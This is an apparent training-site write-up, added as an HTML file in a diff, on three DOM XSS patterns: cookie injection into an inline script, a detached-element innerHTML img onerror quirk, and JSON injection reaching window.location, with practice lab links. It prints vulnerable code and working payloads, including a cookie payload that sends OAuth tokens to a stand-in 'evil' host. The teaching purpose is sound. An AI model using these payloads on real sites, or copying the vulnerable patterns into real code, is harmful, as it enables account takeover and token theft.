@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cookie Overwrite Bypass + Chrome innerHTML Quirk + JSON Injection - ClientSide Academy</title>
+  <link rel="stylesheet" href="/css/writeup.css">
+</head>
+<body class="writeup-page">
+  <nav class="writeup-nav">
+    <a href="/writeups">&larr; All Writeups</a>
+    <div class="nav-right">
+      <a href="/elmahdi/signup" class="try-lab">Try the Labs &rarr;</a>
+    </div>
+  </nav>
+
+  <div class="writeup-container">
+    <div class="writeup-meta">
+      <span class="writeup-sev critical">Critical</span>
+      <span class="writeup-category">DOM XSS &middot; Cookie &middot; Chrome Quirk &middot; JSON Injection</span>
+    </div>
+
+    <h1>Three DOM XSS Patterns: Cookie Overwrite Bypass, Chrome innerHTML Quirk, and JSON Injection</h1>
+    <div class="writeup-author">Based on <strong>elmahdi4</strong>'s research &middot; Three distinct DOM XSS vulnerabilities chained into full account takeover</div>
+
+    <div class="callout callout-vuln">
+      <h4>Summary</h4>
+      <p>A single target had three separate DOM XSS paths, each with different source/sink combinations. All reached full account takeover via OAuth token theft. This writeup walks through each pattern, the bypass techniques, and the final exploit chain.</p>
+    </div>
+
+    <h2>Pattern 1: Cookie-Scoped DOM XSS + Server Overwrite Bypass</h2>
+
+    <h3>The Vulnerability</h3>
+    <p>The app read the <code>lang</code> cookie via regex and injected it into an inline script string:</p>
+    <pre><code>function i() {
+  const t = document.cookie.match(new RegExp("(^| )lang=([^;]+)"));
+  const i = t ? t[2] : "en";
+  return { lang: i };
+}
+
+// Later...
+const scriptCode = `var page = { config: { lang: "${p || i().lang}" } };`;
+const s = document.createElement('script');
+s.text = scriptCode;
+document.head.appendChild(s);</code></pre>
+
+    <p>An attacker setting <code>lang="; alert(1); //</code> as a cookie escapes the string literal, injects arbitrary JS, and comments out the rest. When the fresh script element is appended, the browser evaluates it.</p>
+
+    <h3>The Server-Side Defense</h3>
+    <p>The backend tried to patch this by overwriting the <code>lang</code> cookie on sensitive endpoints:</p>
+    <pre><code>// On /login response:
+Set-Cookie: lang=en; Path=/; Max-Age=86400</code></pre>
+
+    <p>Any malicious cookie value got replaced with <code>en</code> before the vulnerable JS could read it. Clever defense &mdash; but incomplete.</p>
+
+    <h3>The Bypass</h3>
+    <p>The same vulnerable JS ran on <code>/signup</code>, <code>/reset-password</code>, <code>/invite</code>, and other flows. The developer only patched <code>/login</code>. Any unpatched endpoint still processed the attacker's cookie value.</p>
+
+    <div class="callout callout-chain">
+      <h4>Attack Chain</h4>
+      <p>1. Attacker sets cookie: <code>document.cookie = 'lang="; fetch("/oauth/token").then(r=>r.json()).then(t=>fetch("https://evil/?"+btoa(JSON.stringify(t)))); //; path=/'</code></p>
+      <p>2. Victim navigates to <code>/signup</code> (no Set-Cookie overwrite)</p>
+      <p>3. Vulnerable JS reads the attacker's cookie, interpolates it into the inline script</p>
+      <p>4. Script executes, steals OAuth tokens, exfiltrates to attacker server</p>
+      <p>5. Attacker uses stolen tokens for full account takeover</p>
+    </div>
+
+    <h3>Lessons</h3>
+    <ul>
+      <li><strong>Security must be applied at the source, not at the perimeter.</strong> Fixing the XSS sink would have killed all instances.</li>
+      <li>Server-side cookie overwriting is a brittle defense that breaks silently when new routes are added.</li>
+      <li>Always check <em>every</em> endpoint that processes the same shared client code.</li>
+    </ul>
+
+    <h2>Pattern 2: Chrome innerHTML Quirk via "Detached" Element</h2>
+
+    <h3>The Vulnerability</h3>
+    <p>A postMessage handler processed message data as JSON. To support legacy clients that HTML-encoded their quotes, the handler did a "safe" HTML decode using a <strong>detached</strong> &lt;p&gt; element:</p>
+    <pre><code>window.addEventListener('message', function(event) {
+  let jsonStr = event.data;
+
+  if (jsonStr.indexOf('&amp;quot;') !== -1) {
+    // "Safe" decode - detached element, never appended to DOM
+    const p = document.createElement('p');
+    p.innerHTML = jsonStr;  // The bug lives here
+    jsonStr = p.innerText;
+  }
+
+  const payload = JSON.parse(jsonStr);
+  // ... process payload
+});</code></pre>
+
+    <p>The developer assumed that because the &lt;p&gt; element never entered the DOM, innerHTML assignment couldn't trigger script execution. This is <strong>mostly</strong> true for <code>&lt;script&gt;</code> tags, but not for image-based event handlers.</p>
+
+    <h3>The Chrome Quirk</h3>
+    <p>Chrome (and WebKit) begin loading resources for <code>&lt;img&gt;</code> tags as soon as their <code>src</code> is parsed &mdash; even inside a detached element. When the resource fails to load (e.g. <code>src=x</code>), the <code>onerror</code> handler fires in the page's JS context.</p>
+
+    <pre><code>// Run this in any Chrome console:
+const p = document.createElement('p');
+p.innerHTML = '&lt;img src=x onerror="alert(\'detached!\')"&gt;';
+// alert fires even though p is never appended!</code></pre>
+
+    <h3>The Exploit</h3>
+    <pre><code>// Attacker frames the target page, then sends:
+targetFrame.contentWindow.postMessage(
+  '&amp;quot;&lt;img src=x onerror=maliciousFunction()&gt;',
+  '*'
+);
+
+// The "&amp;quot;" prefix triggers the vulnerable decoder path.
+// innerHTML parses the img tag, Chrome loads src=x, fails, onerror fires.
+// XSS in the context of the target page.</code></pre>
+
+    <div class="callout callout-impact">
+      <h4>Why This Matters</h4>
+      <p>Developers frequently use detached elements as "sanitizers" &mdash; DOMParser, temporary divs, document fragments. The Chrome quirk breaks this assumption for <code>&lt;img&gt;</code>, <code>&lt;iframe&gt;</code>, and other resource-loading tags. Any detached-element decoder that accepts attacker-controlled HTML is a potential XSS sink.</p>
+    </div>
+
+    <h2>Pattern 3: JSON Injection via Querystring Reflection</h2>
+
+    <h3>The Vulnerability</h3>
+    <p>A config endpoint reflected the <code>v</code> query parameter into the JSON response as a raw string, without escaping:</p>
+    <pre><code>// Server-side (simplified):
+app.get('/api/config', (req, res) => {
+  const v = req.query.v || '1.0';
+  const json = `{
+  "version": "${v}",
+  "features": { ... },
+  "api": { ... }
+}`;
+  res.setHeader('Content-Type', 'application/json');
+  res.send(json);
+});</code></pre>
+
+    <p>By sending crafted characters in <code>v</code>, an attacker could break out of the version string and inject new top-level keys into the JSON.</p>
+
+    <h3>The Dangerous Client Pattern</h3>
+    <p>The client then merged a specific config field into <code>window</code>:</p>
+    <pre><code>fetch('/api/config?v=' + encodeURIComponent(ver))
+  .then(r => r.json())
+  .then(config => {
+    if (config.window) {
+      Object.assign(window, config.window);  // THE SINK
+    }
+  });</code></pre>
+
+    <p>Assigning a string to <code>window.location</code> navigates the page. <code>javascript:</code> URIs execute code.</p>
+
+    <h3>Crafting the Injection</h3>
+    <p>The attacker needs to:</p>
+    <ol>
+      <li>Close the open <code>version</code> string with <code>"</code></li>
+      <li>Inject a new key: <code>,"window":{"location":"javascript:alert(1)"}</code></li>
+      <li>Re-open a dummy key so the trailing <code>"</code> from the template lands in a valid position</li>
+    </ol>
+
+    <pre><code>// Attacker URL:
+/api/config?v=1","window":{"location":"javascript:alert(1)"},"x":"
+
+// Resulting JSON body:
+{
+  "version": "1","window":{"location":"javascript:alert(1)"},"x":"",
+  "features": { ... },
+  "api": { ... }
+}
+
+// Valid JSON. config.window.location = "javascript:alert(1)".
+// Object.assign(window, config.window) triggers navigation → JS execution.</code></pre>
+
+    <div class="callout callout-tip">
+      <h4>Bug Bounty Tip</h4>
+      <p>When auditing JSON config endpoints, test with characters like <code>"</code>, <code>}</code>, <code>]</code>, and <code>,</code> in query parameters. If they come back unescaped, you likely have JSON injection. Then look at what the client does with the parsed config &mdash; anything that uses <code>Object.assign</code>, spreads, or blind property access can be chained to XSS, CSRF, or logic bugs.</p>
+    </div>
+
+    <h2>Why These Patterns Recur</h2>
+    <ol>
+      <li><strong>Security retrofits are fragile.</strong> The cookie overwrite was a band-aid that only covered one endpoint. A proper fix (output encoding at the sink) would have been one line.</li>
+      <li><strong>"Detached" does not mean "inert".</strong> Browsers treat detached elements as live for certain operations. Don't assume a detached <code>innerHTML</code> is safe.</li>
+      <li><strong>String concatenation into structured formats is always a mistake.</strong> Whether it's SQL, HTML, or JSON, interpolating user input into a serialization format without proper encoding creates injection.</li>
+    </ol>
+
+    <div class="lab-link-box">
+      <div>
+        <h4>Practice Lab 1: Cookie Overwrite Bypass</h4>
+        <p>Login endpoint is "patched", signup endpoint isn't. Find the inconsistency and exploit it.</p>
+      </div>
+      <a href="/elmahdi/login" class="lab-link-btn">Open Login &rarr;</a>
+    </div>
+
+    <div class="lab-link-box">
+      <div>
+        <h4>Practice Lab 2: Chrome innerHTML Quirk</h4>
+        <p>Checkout page with a wallet postMessage handler. Trigger the "safe" decoder path to fire an img onerror.</p>
+      </div>
+      <a href="/elmahdi/checkout" class="lab-link-btn">Open Checkout &rarr;</a>
+    </div>
+
+    <div class="lab-link-box">
+      <div>
+        <h4>Practice Lab 3: JSON Injection</h4>
+        <p>Team app loads config from /api/config. The version parameter reflects unescaped. Inject a window property that navigates to a javascript: URI.</p>
+      </div>
+      <a href="/elmahdi/app" class="lab-link-btn">Open App &rarr;</a>
+    </div>
+
+    <div class="writeup-footer">
+      <a href="/writeups/postmessage-iframe-injection">&larr; PostMessage Iframe Injection</a>
+      <a href="/writeups">All Writeups &rarr;</a>
+    </div>
+  </div>
+</body>
+</html>
